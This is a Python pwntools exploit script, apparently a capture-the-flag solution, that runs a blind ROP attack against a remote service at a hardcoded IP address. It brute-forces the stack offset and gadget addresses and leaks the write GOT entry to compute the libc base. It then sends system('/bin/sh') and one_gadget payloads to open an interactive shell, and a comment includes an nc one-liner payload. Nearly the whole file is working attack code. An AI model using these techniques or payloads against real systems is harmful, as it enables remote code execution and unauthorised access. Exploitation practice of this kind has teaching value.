#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

def find_offset():
    i = 1
    while True:
        try:
            p = remote('34.92.37.22', 10000)
            p.sendafter('!\n', 'A' * i)
            p.recv()
            p.close()
            i = i + 1
        except EOFError:
            success('Founded! offset = ' + hex(i - 1))
            return i - 1

def detect_main(offset):
    addr = 0
    for i in range(8):
        for j in range(256):
            p = remote('34.92.37.22', 10000)
            payload = 'A' * offset + p64(addr)[:i] + chr(j)
            p.sendafter('pwn!\n', payload)
            try:
                p.recvuntil('pwn!\n')
            except:
                p.close()
            else:
                p.close()
                addr = addr + j * (0x100 ** i)
                break
    return addr

def detect_write(offset):
    addr = 0
    for i in range(4):
        for j in range(256):
            p = remote('34.92.37.22', 10000)
            payload = 'A' * offset + p64(addr)[:i] + chr(j)
            p.sendafter('pwn!\n', payload)
            try:
                p.recvuntil('Goodbye!\n')
            except:
                p.close()
            else:
                p.close()
                addr = addr + j * (0x100 ** i)
                break
    return addr

def detect_csu(offset, addr):
    csu_pop = 0x400705 + 0x50
    for i in range(0x200):
        p = remote('34.92.37.22', 10000)
        payload = 'A' * offset + p64(csu_pop + i) + p64(0) * 6 + p64(addr)
        p.sendafter('pwn!\n', payload)
        try:
            p.recvuntil('pwn!\n')
        except:
            p.close()
        else:
            p.close()
            csu_pop = csu_pop + i
            break
    return csu_pop

def get_stop_gadget(offset):
    stop_gadget = 0x400000 + 0x600
    stop_gadget_list = []
    while True:
        if stop_gadget > 0x400800:
            return stop_gadget_list
        try:
            p = remote('34.92.37.22', 10000)
            payload = 'A' * offset + p64(stop_gadget)
            p.sendafter('pwn!\n', payload)
            p.recv()
            p.close()
            success('Founded! stop_gadget = ' + hex(stop_gadget))
            stop_gadget_list.append(stop_gadget)
            stop_gadget = stop_gadget + 1
        except Exception:
            stop_gadget = stop_gadget + 1
            p.close()

def get_brop_gadget(offset, stop_gadget):
    brop_gadget = 0x400600
    brop_gadget_list = []
    while True:
        if brop_gadget > 0x400800:
            return brop_gadget_list
        p = remote('34.92.37.22', 10000)
        payload = 'A' * offset + p64(brop_gadget) + p64(0) * 6 + p64(stop_gadget)
        p.sendafter('pwn!\n', payload)
        try:
            p.recvuntil('pwn!\n')
        except:
            p.close()
        else:
            success('Founded!' + hex(brop_gadget))
            brop_gadget_list.append(brop_gadget)
            p.close()
        brop_gadget = brop_gadget + 1

def check_brop_gadget(offset, brop_gadget):
    try:
        p = remote('34.92.37.22', 10000)
        payload = 'A' * offset + p64(brop_gadget) + 'A' * 8 * 10
        p.recv()
        #p.close()
        p.interactive()
        return False
    except Exception:
        #p.close()
        p.interactive()
        return True

offset = 0x28 # find_offset()
success('offset = ' + hex(offset))
main = 0x400576 # detect_main(offset)
success('main = ' + hex(main))
write = 0x400705 # detect_write(offset)
success('write = ' + hex(write))
csu_pop = 0x40077A # detect_csu(offset, main)
success('csu_pop = ' + hex(csu_pop))
csu_loop = csu_pop - 0x1A
pop_rdi_ret = csu_pop + 0x09
pop_rsi_r15_ret = csu_pop + 0x07
call_write = write + 15
code_start = 0x400000
data_start = 0x600000
bss_start = 0x601000
    
def leak(start, length):
    elf = ''
    for i in range((length + 0xff) / 0x100):
        p = remote('34.92.37.22', 10000)
        payload = ('A' * offset + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(start + i * 0x100) + p64(0) + p64(call_write)).ljust(0x80, 'A')
        print repr(payload)
        print len(payload)
        p.sendafter('pwn!\n', payload)
        elf += p.recv(0x100)
        p.close()
    return elf

#code_seg = leak(code_start, 0x1000)
#info(len(code_seg))
#data_seg = leak(bss_start, 0x100)
#info(len(data_seg))
#bss_seg = leak(bss_start, 0x100)
#info(len(bss_seg))
#with open('leak', 'wb') as f:
#    f.write(code_seg + data_seg + bss_seg)
#    f.close()


offset = 0x28 # find_offset()
success('offset = ' + hex(offset))
stop_gadget_list = [
    0x4006ce, # 0 # main
    0x4006cf, # 1
    0x4006dd, # 2
    0x4006e2, # 3
    0x4006e7, # 4
    0x4006ec, # 5 # strange
    0x4006f1, # 6
    0x4006f6, # 7
    0x400705, # 8
    0x40070a, # 9
    0x40070f, # 10
    0x400714, # 11
    0x400776  # 12
] # get_stop_gadget(offset)
success('one stop_gadget = ' + hex(stop_gadget_list[0]))

brop_gadget_list = [0x4006ce, 0x4006cf, 0x4006dd, 0x4006e2, 0x4006e7, 0x4006ec, 0x400776] # get_brop_gadget(offset, 0x6006ce)
success('brop_gadget = ' + hex(brop_gadget_list[-1]))
pop_rdi_ret = 0x400783
pop_rsi_r15_ret = 0x400781
csu_loop = 0x400760
csu_pop = brop_gadget_list[-1]

# python -c "import sys; sys.stdout.write('a'*0x28+'\xf6\x06\x40')" | nc 34.92.37.22 10000
write_addr = 0x4006f6

def hack():
    p = remote('34.92.37.22', 10000)
    payload = 'A' * offset + p64(stop_gadget_list[7])
    p.recvuntil('!\n')
    p.sendline(payload)
    libc_start_main = u64(p.recv()[0x48:0x48+8].ljust(8, '\x00')) - 240
    success('libc_start_main = ' + hex(libc_start_main))
    libc_base = libc_start_main - 0x20740
    success('libc_base = ' + hex(libc_base))
    one_gadget_offset = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    one_gadget = libc_base + one_gadget_offset[0]
    success('one_gadget = ' + hex(one_gadget))
    payload = 'A' * offset + p64(one_gadget)
    p.sendline(payload)
    p.interactive()

# start attack
p = remote('34.92.37.22', 10000)
write_plt = 0x400520
write_got = 0x601018
payload = 'A' * offset + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main)
p.sendafter('pwn!\n', payload)
write = u64(p.recvuntil('\x7f').ljust(8, '\x00'))
success('write = ' + hex(write))
libc_base = write - 0x0f72b0
success('libc_base = ' + hex(libc_base))
# get shell
system = libc_base + 0x045390
str_bin_sh = libc_base + 0x18cd57
payload = 'A' * offset + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)
p.sendafter('pwn!\n', payload)
p.interactive()

